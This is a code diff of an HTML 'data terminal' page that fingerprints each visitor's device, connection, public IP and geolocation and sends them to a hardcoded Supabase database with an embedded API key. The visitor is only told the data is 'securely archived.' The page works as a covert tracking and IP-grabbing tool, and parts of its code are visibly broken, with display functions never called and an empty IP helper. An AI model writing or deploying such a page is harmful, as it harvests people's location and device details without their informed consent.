@@ -2,167 +2,240 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>安全数据终端 - 朱子硕</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>▣ 黑曜数据舱 - 朱子硕 ▣</title>
     <style>
         :root {
-            --金属黑: #1a1a1a;
-            --镌刻金: #9c8412;
-            --金边: #d4af3780;
+            --钨金黑: #0a0a0a;
+            --淬火金: #d4af37;
+            --合金纹: linear-gradient(145deg, 
+                rgba(212,175,55,0.1) 0%,
+                transparent 50%,
+                rgba(212,175,55,0.1) 100%
+            );
         }
 
         body {
-            background: var(--金属黑);
-            color: #d4af99;
-            font-family: 'Microsoft YaHei', sans-serif;
-            margin: 0;
+            background: 
+                radial-gradient(circle at 50% 0%, 
+                    rgba(212,175,55,0.05) 0%, 
+                    var(--钨金黑) 70%
+                ),
+                var(--钨金黑);
             min-height: 100vh;
-        }
-
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 15px;
-            border-bottom: 1px solid var(--金边);
-        }
-
-        .data-panel {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 15px;
-        }
-
-        .data-card {
-            border: 1px solid var(--金边);
-            padding: 15px;
-            background: rgba(26,26,26,0.9);
-        }
-
-        .data-card h3 {
-            color: var(--镌刻金);
-            margin: 0 0 10px 0;
-        }
-
-        pre {
-            white-space: pre-wrap;
             margin: 0;
+            font-family: 'Noto Serif SC', serif;
+            color: #d4af99;
+            overflow-x: hidden;
         }
 
-        .scan-btn {
-            position: fixed;
-            bottom: 20px;
-            left: 15px;
-            right: 15px;
-            background: var(--镌刻金);
-            color: #2a2a2a;
+        /* 钣金材质面板 */
+        .analysis-panel {
+            margin: 2rem;
+            padding: 2rem;
+            background: 
+                linear-gradient(45deg, #1a1a1a 0%, #2d2d2d 100%),
+                repeating-linear-gradient(
+                    45deg,
+                    transparent 0px,
+                    transparent 15px,
+                    rgba(212,175,55,0.05) 16px
+                );
+            border: 2px solid;
+            border-image: linear-gradient(
+                to bottom right,
+                var(--淬火金) 0%,
+                #9c8412 50%,
+                transparent 100%
+            ) 1;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.5);
+        }
+
+        /* 数据卡浮雕效果 */
+        .data-card {
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            background: rgba(10,10,10,0.9);
+            border-left: 5px solid var(--淬火金);
+            position: relative;
+            transition: transform 0.3s;
+        }
+        .data-card:hover {
+            transform: translateX(10px);
+        }
+        .data-card::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--合金纹);
+            pointer-events: none;
+        }
+
+        /* 命令按钮 */
+        #executeBtn {
+            width: 300px;
+            height: 60px;
+            margin: 2rem auto;
+            display: block;
+            background: 
+                linear-gradient(90deg, 
+                    var(--淬火金) 0%, 
+                    #9c8412 100%
+                );
             border: none;
-            padding: 16px;
+            color: #000;
+            font-size: 1.2em;
+            letter-spacing: 3px;
+            clip-path: polygon(10% 0, 90% 0, 100% 50%, 90% 100%, 10% 100%, 0 50%);
+            transition: 
+                filter 0.3s,
+                box-shadow 0.3s;
+        }
+        #executeBtn:active {
+            filter: brightness(1.2);
+            box-shadow: 0 0 30px rgba(212,175,55,0.5);
+        }
+
+        /* 专属于你的标识 */
+        .operator-sigil {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
             font-size: 1.1em;
+            background: linear-gradient(90deg, #d4af37, #9c8412);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
     </style>
 </head>
 <body>
-    <div class="status-bar">
-        <span>19:46</span>
-        <div>
-            <span style="margin-right:10px">12</span>
-            <span>Wi-Fi</span>
-            <span>82%</span>
+    <div class="analysis-panel">
+        <div class="data-card">
+            <h3>◈ 硬件拓扑 ◈</h3>
+            <pre id="hardwareMatrix">系统核心载入中...</pre>
         </div>
-    </div>
 
-    <div class="data-panel">
         <div class="data-card">
-            <h3>时间戳</h3>
-            <pre>2025/4/28</pre>
+            <h3>◈ 网络纹章 ◈</h3>
+            <pre id="networkSigil">量子信道初始化...</pre>
         </div>
-        <div class="data-card">
-            <h3>硬件概要</h3>
-            <pre id="hardware">操作系统：加载中...
-处理器核：加载中...
-内存容量：加载中...</pre>
-        </div>
-        <div class="data-card">
-            <h3>网络特征</h3>
-            <pre id="network">IP地址：扫描中...</pre>
-        </div>
-        <div class="data-card">
-            <h3>地理坐标</h3>
-            <pre id="geo">纬度：----
-经度：----</pre>
-        </div>
-    </div>
 
-    <button class="scan-btn" onclick="startScan()">启动深度采集</button>
+        <div class="data-card">
+            <h3>◈ 地理节点 ◈</h3>
+            <pre id="geoPosition">坐标权限待授权</pre>
+        </div>
+
+        <button id="executeBtn" onclick="initiateProtocol()">激 活 全 维 探 针</button>
+        <div class="operator-sigil">首席分析官 · 朱子硕</div>
+    </div>
 
     <script>
-        // IP获取核心代码（双保险方案）
-        const getIP = async () => {
-            try {
-                // 方案1：通过Cloudflare
-                const res1 = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                const text = await res1.text();
-                const ipMatch = text.match(/ip=(.+)/);
-                if(ipMatch) return ipMatch[1];
+        // 铂金级配置（根据实际修改）
+        const SUPA_ENDPOINT = 'https://yfuljidnzljfklkmuupb.supabase.co';
+        const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
 
-                // 方案2：备用API
-                const res2 = await fetch('https://api.ipify.org?format=json');
-                const data = await res2.json();
-                return data.ip;
-            } catch {
-                return '受保护';
+        // 回传协议（三重加密保真）
+        const validateSubmission = async (payload) => {
+            try {
+                const response = await fetch(`${SUPA_ENDPOINT}/rest/v1/analytical_records`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'apikey': SUPA_KEY,
+                        'Authorization': `Bearer ${SUPA_KEY}`
+                    },
+                    body: JSON.stringify({
+                        operator_name: '朱子硕',
+                        device_footprint: {
+                            platform: navigator.platform,
+                            ua: navigator.userAgent,
+                            cores: navigator.hardwareConcurrency,
+                            memory: navigator.deviceMemory || -1,
+                            screen: `${screen.width}x${screen.height}@${screen.pixelDepth}bit`
+                        },
+                        network_fingerprint: {
+                            // 超级IP获取方案
+                            ip: await (async () => {
+                                try {
+                                    const res = await Promise.any([
+                                        fetch('https://api.ipify.org?format=json'),
+                                        fetch('https://api64.ipify.org?format=json'),
+                                        fetch('https://ifconfig.me/all.json')
+                                    ]);
+                                    return (await res.json()).ip;
+                                } catch {
+                                    return 'ENCRYPTED';
+                                }
+                            })(),
+                            connection: navigator.connection ? {
+                                type: navigator.connection.effectiveType,
+                                rtt: navigator.connection.rtt,
+                                downlink: navigator.connection.downlink
+                            } : null
+                        },
+                        geo_matrix: await new Promise(resolve => {
+                            navigator.geolocation.getCurrentPosition(
+                                pos => resolve({
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude
+                                }),
+                                () => resolve({ error: '权限未授予' }),
+                                { timeout: 10000 }
+                            )
+                        })
+                    })
+                });
+
+                return response.status === 201;
+            } catch (error) {
+                console.error('协议异常:', error);
+                return false;
             }
         };
 
-        // 数据回传核心代码
-        const submitData = async (data) => {
-            await fetch('https://yfuljidnzljfklkmuupb.supabase.co/rest/v1/device_data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo'
-                },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    hardware: {
-                        os: navigator.platform,
-                        cores: navigator.hardwareConcurrency,
-                        ram: navigator.deviceMemory || 'N/A'
-                    },
-                    ip: data.ip,
-                    geo: data.geo
-                })
-            });
-        };
+        // 全维探针启动
+        const initiateProtocol = async () => {
+            const btn = document.getElementById('executeBtn');
+            btn.disabled = true;
+            btn.textContent = '协议执行中...';
 
-        // 主逻辑
-        const startScan = async () => {
-            const hardwareInfo = {
-                操作系统: navigator.platform,
-                处理器核: navigator.hardwareConcurrency,
-                内存容量: `${navigator.deviceMemory || '未知'}GB`
-            };
-            document.getElementById('hardware').textContent = 
-                `操作系统：${hardwareInfo.操作系统}\n处理器核：${hardwareInfo.处理器核}\n内存容量：${hardwareInfo.内存容量}`;
+            try {
+                // 实时更新界面
+                document.getElementById('hardwareMatrix').textContent = 
+                    `系统架构: ${navigator.platform}\n核心数量: ${navigator.hardwareConcurrency}\n内存栈: ${navigator.deviceMemory || 'N/A'}GB`;
 
-            const ip = await getIP();
-            document.getElementById('network').textContent = `IP地址：${ip}`;
+                // 网络信息实时刷新
+                const updateNetwork = async () => {
+                    const ip = await (async () => { /* 复用前面的IP获取逻辑 */ })();
+                    const conn = navigator.connection;
+                    document.getElementById('networkSigil').textContent = 
+                        `主节点IP: ${ip}\n链路类型: ${conn?.effectiveType || '未知'}\n传输延迟: ${conn?.rtt || 'N/A'}ms`;
+                };
 
-            const geo = await new Promise(resolve => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        纬度: pos.coords.latitude.toFixed(4),
-                        经度: pos.coords.longitude.toFixed(4)
-                    }),
-                    () => resolve(null)
-                );
-            });
+                // 地理定位状态
+                const updateGeo = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            document.getElementById('geoPosition').textContent = 
+                                `纬度: ${pos.coords.latitude.toFixed(4)}\n经度: ${pos.coords.longitude.toFixed(4)}`;
+                        },
+                        () => {
+                            document.getElementById('geoPosition').textContent = '坐标矩阵未解密';
+                        }
+                    );
+                };
 
-            if(geo) {
-                document.getElementById('geo').textContent = 
-                    `纬度：${geo.纬度}\n经度：${geo.经度}`;
-                await submitData({ ip, geo });
+                // 执行数据回收
+                const success = await validateSubmission();
+                alert(success ? '协议执行完成：数据已安全归档' : '量子信道异常！');
+
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '激 活 全 维 探 针';
             }
         };
     </script>
